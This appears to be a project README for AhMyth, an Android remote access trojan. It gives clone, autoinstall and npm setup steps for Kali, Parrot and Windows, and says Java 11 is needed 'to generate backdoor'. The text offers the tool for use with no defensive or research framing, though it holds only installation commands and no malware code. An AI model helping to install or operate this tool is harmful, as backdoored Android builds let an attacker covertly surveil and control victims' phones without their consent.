# AhMyth Android Rat
### Getting Started
###### The Application uses two parts
- the **`Server`** side
- the **`Client`** side 

###### You can install AhMyth in 3 ways
1. From Source
2. Manually using **`npm`** or **`yarn`**
3. Automatically using the **`autoinstaller`** file

###### Make sure you have all the prerequisites listed below, installed before setup
### PREREQUISITES
- npm & nodejs 
- electron (To start the app)
- Java 11 openjdk (To generate backdoor)
- electron packager (if you want to build binaries for Windows/Mac/Linux)
----------------
# INSTALLATION

### Kali Linux & Parrot OS
#### Auto install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```chmod +x autoinstall```
4. ```sudo ./autoinstall```
###### Once the installer has installed AhMyth and its prerequisites, it will prompt you to change your java version
5.  ```Select the corresponding number for Java 11 openjdk``` - Example: `0`
6. type `ahmyth` anywhere inside your terminal to automatically launch AhMyth or you can launch AhMyth from your Applications menu

#### Manual Install
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```npm install && npm audit```
4. ```sudo apt install openjdk-11-jdk openjdk-11-jre```
5. ```sudo update-alternatives --config java``` 
6. ```Select the corresponding number for openjdk-11-jdk``` - **Example:** **`0`**
7. ```npm start```
------------------

### Windows 10 Installation
#### Auto Install
1. Navigate to the `Releases` section - https://github.com/Morsmalleo/AhMyth/releases
2. Click on the latest release version of AhMyth - currently `1.0-beat.3`
3. Click on the `AhMyth_Win64-Setup.exe` file, or the `AhMyth_Win32-Setup.exe` file, to download it 
4. Once downloaded, double click the file and this will begin to install AhMyth for windows automatically
5. Once AhMyth has been installed, you can start it by double clicking the desktop shortcut 

#### Manual Install
1. Install npm & nodejs for Windows 10 - https://nodejs.org/en/download/
2. Install Java 11 for Windows 10 - https://www.oracle.com/au/java/technologies/javase-jdk11-downloads.html
3. Install Git for Windows 10 - https://git-scm.com/downloads
###### Open git bash for Windows and navigate to where you want to install AhMyth
4. ```git clone https://github.com/Morsmalleo/AhMyth```
5. ```cd C:\Users\your-username-here\Desktop\AhMyth\AhMyth-Server```
6. ```npm install && npm audit```
7. ```npm start``` or ```npx electron ./app --no-sandbox start```

--------------------------------------------------------------------------
##### This is not my work, I have only contributed to this wonderful tool.
